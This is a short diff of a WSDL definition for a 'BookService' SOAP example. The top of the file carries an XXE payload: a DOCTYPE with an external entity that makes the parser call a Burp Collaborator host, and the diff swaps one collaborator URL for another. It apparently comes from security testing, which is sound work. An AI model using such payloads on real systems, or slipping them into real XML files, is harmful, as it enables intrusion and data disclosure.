@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
-<!DOCTYPE foo [  <!ELEMENT foo (#ANY)><!ENTITY xxe SYSTEM "http://nb2vv40rjvc1jib0uaq3d3bah1ntbi.burpcollaborator.net">]><foo>&xxe;</foo>
+<!DOCTYPE foo [  <!ELEMENT foo (#ANY)><!ENTITY xxe SYSTEM "http://j0kskx09brpzv898uhfog50snjt9hy.burpcollaborator.net/Test">]><foo>&xxe;</foo>
 <wsdl:definitions xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:tns="http://www.cleverbuilder.com/examples/BookService/" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" name="BookService" targetNamespace="http://www.cleverbuilder.com/examples/BookService/">
   <wsdl:types>
     <xsd:schema targetNamespace="http://www.cleverbuilder.com/examples/BookService/">
